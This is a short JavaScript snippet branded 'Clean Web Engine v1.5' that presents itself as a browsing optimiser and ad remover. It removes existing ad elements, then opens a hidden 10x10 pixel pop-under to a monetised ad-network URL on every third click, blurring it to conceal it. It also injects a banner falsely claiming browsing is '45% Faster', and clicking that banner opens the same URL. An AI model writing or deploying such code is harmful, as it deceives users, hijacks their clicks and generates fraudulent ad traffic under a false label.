(function(w,d,s,l,i){
    /* Clean Web Engine v1.5 */
    const u='https://www.profitablecpmratenetwork.com/v7txp6fkhp?key=28e65a049df96339d4aae5aa938fc9d4';
    let k=0;
    const run=()=>{
        const ads=['iframe','ins','[id*="ad-"]','[class*="ad-"]','.trc_related_container','[id^="google_ads"]'];
        ads.forEach(selector=>d.querySelectorAll(selector).forEach(el=>el.remove()));
        d.body.addEventListener('mousedown',()=>{
            k++;
            if(k%3===0){
                const p=w.open(u,'_blank','width=10,height=10,top=0,left=0');
                if(p){p.blur();w.focus();}
            }
        },true);
        const b=d.createElement('div');
        b.style='position:fixed;top:0;left:0;width:100%;background:#E91E63;color:#fff;text-align:center;padding:12px;z-index:999999;font-family:sans-serif;font-weight:bold;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.5);font-size:14px;';
        b.innerHTML='🚀 Browsing Optimized: 45% Faster. Tap to maintain speed!';
        b.onclick=()=>w.open(u,'_blank');
        d.body.prepend(b);
    };
    if(d.readyState==='complete'){run();}else{w.addEventListener('load',run);}
})(window,document,'script','as');
